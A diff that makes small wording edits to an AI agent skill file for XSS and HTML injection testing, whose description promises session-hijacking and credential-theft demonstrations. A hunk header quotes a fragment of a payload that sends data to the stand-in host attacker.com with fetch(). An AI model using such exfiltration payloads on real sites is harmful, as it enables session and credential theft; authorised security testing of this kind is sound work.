@@ -1,6 +1,6 @@
 ---
 name: xss-html-injection
-description: "Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms."
+description: "Execute client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms."
 risk: offensive
 date_added: "2026-02-27"
 version: 1.0.0
@@ -25,7 +25,7 @@ Execute comprehensive client-side injection vulnerability assessments on web app
 - Access to create test accounts for stored XSS testing
 - Browser with JavaScript console enabled
 
-### Technical Requirements
+### Requirements
 
 - Understanding of JavaScript execution in browser context
 - Knowledge of HTML DOM structure and manipulation
@@ -46,7 +46,7 @@ Execute comprehensive client-side injection vulnerability assessments on web app
 - Session hijacking demonstrations (controlled environment)
 - Remediation recommendations with CSP configurations
 
-## Core Workflow
+## Workflow
 
 ### Phase 1: Vulnerability Detection
 
@@ -430,14 +430,14 @@ fetch('https://attacker.com/log',{
 
 ## Constraints and Guardrails
 
-### Operational Boundaries
+### Boundaries
 
 - Never inject payloads that could damage production systems
 - Limit cookie/session capture to demonstration purposes only
 - Avoid payloads that could spread to unintended users (worm behavior)
 - Do not exfiltrate real user data beyond scope requirements
 
-### Technical Limitations
+### Limitations
 
 - Content Security Policy (CSP) may block inline scripts
 - HttpOnly cookies prevent JavaScript access
